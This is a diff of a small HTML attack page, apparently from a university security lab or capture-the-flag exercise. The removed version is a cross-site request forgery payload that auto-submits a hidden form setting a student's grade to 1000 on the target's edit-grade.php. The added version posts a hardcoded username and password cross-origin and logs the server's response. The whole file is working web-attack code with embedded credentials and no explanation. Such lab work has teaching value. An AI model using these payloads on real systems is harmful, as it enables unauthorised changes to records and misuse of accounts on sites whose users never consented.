@@ -1,14 +1,22 @@
-<!DOCTYPE html>
-    <head>
-        <meta http-equiv="refresh" content="300">
-    </head>
-    <body>
-        <script>
-        var url="http://ywang90-flag.foouniversity.com/edit-grade.php?handin=228";
-        var tmp = window.open(url,"profile");
-        document.write('<form id="wrappingThing" action="'+url+'" method="post"><input type="text" name="grade" value="1000"><input type="hidden" name="handin" value="228">');
-        document.forms["wrappingThing"].target = "profile";
-        document.forms["wrappingThing"].submit();
-        </script>
-    </body>
+<html>
+<body>
+<script>
+	var data = new FormData();
+	data.append('username', 'ywang90');
+	data.append('pass', 'iamywang90');
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", "http://ywang90-flag.foouniversity.com/", true);
+	xhr.onreadystatechange = function () {
+		if (xhr.readyState == 4 &&xhr.status == 200) {
+	        if (xhr.responseText == "") {
+				console.log("fuck");
+			}else {
+				console.log(xhr.getAllResponseHeaders()+xhr.responseText.split('"').join("'"));
+	  		}
+	  		
+	  	}
+	};
+	xhr.send(data);
+</script>
+</body>
 </html>
